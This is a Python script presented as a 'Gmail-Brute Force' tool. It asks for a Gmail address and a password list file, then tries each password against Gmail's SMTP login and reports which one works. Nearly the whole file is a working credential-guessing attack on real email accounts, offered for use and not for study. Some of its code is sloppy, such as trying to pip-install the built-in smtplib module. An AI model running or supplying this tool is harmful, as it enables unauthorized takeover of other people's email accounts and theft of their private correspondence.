#!/usr/bin/python3
# This Programm Write by Mr.nope
# Gmail-Brute Force v1.4.3
import os
import time
import sys
import platform
try:
    import smtplib
    from email.message import EmailMessage
except ImportError:
    os.system("pip3 install smtplib")
    import smtplib
    from email.message import EmailMessage
try:
    from colorama import Fore,init
    init()
except ImportError:
    os.system("pip3 install colorama")
system = platform.uname()[0]
End = '\033[0m'
Run_Err = "\nPlease, Run This Programm on Linux or MacOS!\n"
banner = Fore.GREEN + """
.----..----..-.  .-.  .--.  .-..-.        .----. .---. .-. .-..-----..----.    .----. .---. .---. .----..----. """ + Fore.CYAN + " :)" + Fore.GREEN + """
| |--'} |__}}  \/  { / {} \ { |} |    ___ | {_} }} }}_}| } { |`-' '-'} |__}    } |__}/ {-. \} }}_}| }`-'} |__} 
| }-`}} '__}| {  } |/  /\  \| }} '--.{___}| {_} }| } \ \ `-' /  } {  } '__}    } '_} \ '-} /| } \ | },-.} '__} 
`----'`----'`-'  `-'`-'  `-'`-'`----'     `----' `-'-'  `---'   `-'  `----'    `--'   `---' `-'-' `----'`----' 
                                                                                                              """ + End
def main():
    os.system("printf '\033]2;Gmail-Brute Force\a'")
    os.system("clear")
    print(banner)
    Addr = input("\nEnter Gmail Address: ")
    time.sleep(0.35)
    pass_file = input("\nEnter Passlist: ")
    time.sleep(0.51)
    passlist = open(pass_file,"r").read().split()
    for Password in passlist:
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com',465) as s: 
                s.login(Addr,Password) 
                print(f"Password: {Password} Found!")
        except smtplib.SMTPAuthenticationError:
            print(f"{Password} Not Found!")
    time.sleep(1)
    try1()
def try1():
    try_to_exit = input("\npress Enter...")
    if try_to_exit == '':
        ext()
    else:
        ext()
def ext():
    print(Fore.GREEN + "Exiting..." + End)
    sys.exit()
if __name__ == '__main__':
    try:
        try:
            if system == 'Linux':
                main()
            else:
                print(Run_Err)
                sys.exit()
        except KeyboardInterrupt:
            print("\nCtrl + C")
            print("\nExiting...")
            sys.exit()
    except EOFError:
        print("\nCtrl + D")
        print("\nExiting...")
        sys.exit()